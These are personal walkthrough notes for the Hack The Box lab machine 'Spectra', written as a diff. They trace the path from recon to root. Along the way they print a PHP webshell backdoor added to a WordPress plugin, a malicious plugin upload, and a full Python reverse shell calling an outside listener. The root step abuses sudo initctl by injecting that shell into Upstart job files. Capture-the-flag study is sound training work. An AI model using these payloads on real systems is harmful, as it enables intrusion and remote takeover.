@@ -1,0 +1,134 @@
+HTB - Spectra
+
+=== RECON ===
+Nmap
+$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.229
+$ nmap -p 22,80,3306 -sCV -oA scans/nmap-tcpscripts 10.10.10.229
+
+Website - TCP 80
+- Plain website with text and two links (software issue tracker and test)
+- Both links reference spectra.htb -> added to /etc/hosts
+    10.10.10.229 spectra.htb
+- Ran wfuzz to look for subdomains
+
+Spectra.htb
+- Second link leads to http://spectra.htb/testing/index.php -> error
+- http://spectra.htb/testing/ -> directory listing
+    wp-config.php is where database username and password is stored, but clicking on it will run PHP in background and return empty page
+    wpconfig.php.save file (created by nano) -> clicking on this returns blank page, viewing source gives text
+    Contains database creds
+$ mysql -h 10.10.10.197 -u devtest -p devteam01 -> no connections allowed from his IP
+
+- http://spectra.htb/main/ is wordpress site
+$ wpscan --url http://spectra.htb/main -e ap,t,tt,u --api-token $WPSCAN_API
+$ export WPSCAN_API=p0P7AM... saved to ~/.bashrc
+
+=== SHELL AS NGINX ===
+WP Login
+- Login link leads to standard wordpress login
+    Devtest user does not exist
+    Password devteam01 with administrator user works
+
+Webshell Upload
+- Tried editing a theme to include a webshell
+    Appearance -> theme editor -> access to theme pages
+    Loaded 404 template with system('id'); line at the top
+    After save can access page at /main/wp-content/themes/twentytwenty/404.php
+    Unable to communicate with site, need to upload PHP file through other mean, such as SFTP
+
+- In plugins tab there are two existing plugins
+    Click on plugin editor -> taken to editor with akismet anti-spam loaded and akismet.php in the editor
+    Can find plugin at [WP root]/wp-content/plugins/[plugin name]/[filename]
+$ curl http://spectra.htb/main/wp-content/plugins/akismet/akismet.php
+Hi there!  I'm just a plugin, not much I can do when called directly.
+
+- Section of code added to akismet.php if parameter 0xdf is there
+// Make sure we don't expose any info if called directly
+if (isset($_REQUEST['0xdf'])) { system($_REQUEST['0xdf']);}
+if ( !function_exists( 'add_action' ) ) {
+    echo 'Hi there! I\'m just a plugin, not much I can do when called directly.';
+    exit;
+}
+
+$ http://spectra.htb/main/wp-content/plugins/akismet/akismet.php?0xdf=id
+uid=20143(nginx) gid=20144(nginx) groups=20144(nginx)
+Hi there!  I'm just a plugin, not much I can do when called directly.
+
+- Wordpwn and a metasploit module could create a plugin
+- Create webshell from scratch and name 0xdf.php
+<?php
+ /*
+ Plugin Name: 0xdf Plugin
+ Version: 1.0.0
+ Author: 0xdf
+ Author URI: wordpress.org
+ License: GPL2
+ */
+system($_REQUEST["0xdf"]);
+?>
+
+$ zip 0xdf-plug.zip 0xdf.php
+- Plugins -> add new -> upload plugin -> install now
+    No need to activate, installing is enough to drop file at right path
+$ curl http://spectra.htb/main/wp-content/plugins/oxdf-plug/oxdf.php?0xdf=id
+uid=20143(nginx) gid=20144(nginx) groups=20144(nginx)
+
+Shell
+- Netcat not on the host but python reverse shell works
+$ curl http://spectra.htb/main/wp-content/plugins/0xdf-plug/0xdf.php --data-urlencode "0xdf=python -c 
+'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((\"10.10.14.7\",443));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+$ nc -lnvp 443 -> reverse shell listener
+> python -c 'import pty;pty.spawn("bash")' -> ^Z
+> stty raw -echo; fg -> shell upgrade
+
+=== SHELL AS KATIE ===
+Enumeration
+> cat /etc/lsb-release -> solves mystery about OS (is chrome)
+- Several directories in /home
+    Can't access katie or root
+- In /opt directory -> autologin.conf.orig
+    Script that's started upon boot completion
+    Checks in two paths for passwd file -> if either is there -> breaks and runs inject-keys.py -s $passwd -k enter
+> ls /mnt/stateful_partition/etc/autologin -> cannot access: no such file or directory
+> ls /etc/autologin/ -> passwd
+    Two paths from autologin.conf.orig
+> cat /etc/autologin/passwd -> SummerHereWeCome!!
+
+SSH
+> cat /etc/passwd | grep -v false -> root, chronos, nginx, katie don't have shell /bin/false
+> crackmapexec ssh 10.10.10.229 -u users -p 'SummerHereWeCome!!' --continue-on-success -> checks SSH for that password -> works for katie
+
+Shell
+$ sshpass -p 'SummerHereWeCome!!' ssh katie@10.10.10.229
+> cat user.txt -> USER FLAG
+
+=== SHELL AS ROOT ===
+Enumeration
+> sudo -l -> katie has sudo rights on /sbin/initctl
+    initctl allows a system admin to communicate and interact with Upstart init(8) daemon
+> id -> katie is also member of developers group
+> find / -type f -group developers 2>/dev/null -ls -> bunch of /etc/init/test*.conf files and a nodetest.js script
+    .conf files all the same
+    Each contains similar structure that includes script blocks
+    nodetest.js contains nodejs script to start hello world style webserver
+
+Upstart POC
+- Add line to script section of .conf files
+    exec id > /tmp/0xdf
+> sudo initctl status test -> service is currently stopped
+> sudo initctl start test
+> cat /tmp/0xdf -> output of id ran as root
+
+Shell
+- Replace exec id line in script with python reverse shell from earlier
+> sudo initctl start test
+$ nc -lnvp 443
+> id -> shell is root
+> cat root.txt -> ROOT FLAG
